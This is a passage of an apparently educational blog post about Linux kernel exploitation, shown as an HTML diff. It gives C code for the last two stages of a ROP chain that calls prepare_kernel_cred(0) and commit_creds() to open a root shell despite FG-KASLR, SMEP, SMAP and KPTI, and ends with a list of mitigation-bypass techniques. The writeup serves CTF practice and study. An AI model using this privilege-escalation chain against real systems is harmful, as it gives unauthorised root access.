+</code></pre></div><p>And with that, we have all the addresses that we need for a privileges escalation chain.</p>
+<h2 id="calling-prepare_kernel_cred0">Calling prepare_kernel_cred(0)</h2>
+<p>Because of the limited amount of gadgets that we have, I couldn&rsquo;t find an easy way to perform a ROP chain that calls <code>commit_creds(prepare_kernel_cred(0))</code> and pop a root shell in one go (recall that I used some bizarre gadgets in the last part, and those aren&rsquo;t in the regions which are unaffected by <code>FG-KASLR</code>). Therefore, I have to follow the technique used in the original writeup by the author, in which they split the chain into 2 parts: calling <code>prepare_kernel_cred(0)</code> in the first attempt, saving the return value in <code>rax</code> to memory, which is the address of the <code>cred_struct</code> to be commited, then calling <code>commit_creds()</code> using that saved value in another attempt. By doing this, we don&rsquo;t have to concern about the most difficult part in a privileges escalation ROP chain, which is how to move the return value of <code>prepare_kernel_cred(0)</code> in <code>rax</code> to <code>rdi</code> to pass to <code>commit_creds()</code>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">stage_3</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi_rbp_ret</span><span class="p">;</span> <span class="c1">// return address
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// rdi &lt;- 0
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// dummy rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span> <span class="c1">// prepare_kernel_cred(0)
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_trampoline</span><span class="p">;</span> <span class="c1">// swapgs_restore_regs_and_return_to_usermode + 22
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rax
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rdi
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">after_prepare_kernel_cred</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload to call prepare_kernel_cred(0)&#34;</span><span class="p">);</span>
+    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">after_prepare_kernel_cred</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">__asm__</span><span class="p">(</span>
+        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
+        <span class="s">&#34;mov tmp_store, rax;&#34;</span>
+        <span class="s">&#34;.att_syntax;&#34;</span>
+    <span class="p">);</span>
+    <span class="n">returned_creds_struct</span> <span class="o">=</span> <span class="n">tmp_store</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; returned_creds_struct: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">returned_creds_struct</span><span class="p">);</span>
+    <span class="n">stage_4</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div><p>Notice that we can reuse <code>tmp_store</code> to store our returned <code>cred_struct</code> as well, very convenient.</p>
+<h2 id="calling-commit_creds-and-opening-root-shell">Calling commit_creds() and opening root shell</h2>
+<p>Finally, we use the ROP chain one last time to calle <code>commit_creds()</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">stage_4</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi_rbp_ret</span><span class="p">;</span> <span class="c1">// return address
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">returned_creds_struct</span><span class="p">;</span> <span class="c1">// rdi &lt;- returned_creds_struct
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// dummy rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span> <span class="c1">// commit_creds(returned_creds_struct)
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_trampoline</span><span class="p">;</span> <span class="c1">// swapgs_restore_regs_and_return_to_usermode + 22
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rax
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rdi
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload to call commit_creds(returned_creds_struct)&#34;</span><span class="p">);</span>
+    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>After stage 4, we have successfully opened a root shell under this fully protected environment.</p>
+<div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">In the original writeup, the authors stated that some how the state is corrupted and they can only open <code>/dev/sda</code> to read the flag file while not being able to open a root shell. This doesn&rsquo;t seem to be the case for me since my exploit can open a stable shell just fine. I don&rsquo;t really know why it happens because the idea of the 2 exploits are the same, the only differences are in the way we code our exploit.</div>
+        </div>
+    </div>
+<h2 id="summary">Summary</h2>
+<p>And that concludes this series. We have come to this point where we have a collection of techniques to bypass all of the most modern mitigation features in the Linux kernel. Below is a summary of the techniques we have used accross 3 parts:</p>
+<ol>
+<li>If the kernel has no protection, use <code>ret2usr</code>.</li>
+<li>If it has <code>SMEP</code>, <code>ret2usr</code> is no longer viable use <code>ROP</code> to call <code>commit_creds(prepare_kernel_cred(0))</code>.</li>
+<li>If overflow is limited on the stack, use a <code>pivot gadget</code>.</li>
+<li>If it has <code>KPTI</code>, modify <code>ROP</code> to use <code>KPTI trampoline</code> or <code>signal handler</code>.</li>
+<li>If it has <code>SMAP</code>, stack pivot is no longer viable.</li>
+<li>If it has normal <code>KASLR</code>, a single leak of a <code>.text</code> address is sufficient.</li>
+<li>If it has <code>FG-KASLR</code>, make use of regions that are unaffected and <code>ksymtab</code>.</li>
+</ol>
+<p>One more thing, I want to say thanks for all the supports and the kind words that I have received since I started posting this series. At first, my intention was only to write this as a documentation for myself and a few friends of mine. However, it turns out that a lot of people really appreciates this kind of technical posts, and it gets spread wider than I can ever expect. I am really grateful that my little work here is useful for the community.</p>
+<h2 id="appendix">Appendix</h2>
+<p>The full exploit code is <a href="/posts/20210205-linux-kernel-pwn-part-3/a.c" rel="">a.c</a>.</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-02-05</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/20210201-justctf2020-writeups/" class="prev" rel="prev" title="justCTF[*]2020 - debug_me_if_you_can, REmap writeups"><i class="fas fa-angle-left fa-fw"></i>justCTF[*]2020 - debug_me_if_you_can, REmap writeups</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.80.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":60},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-HGQHGNF9HJ');
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-HGQHGNF9HJ" async></script></body>
+</html>
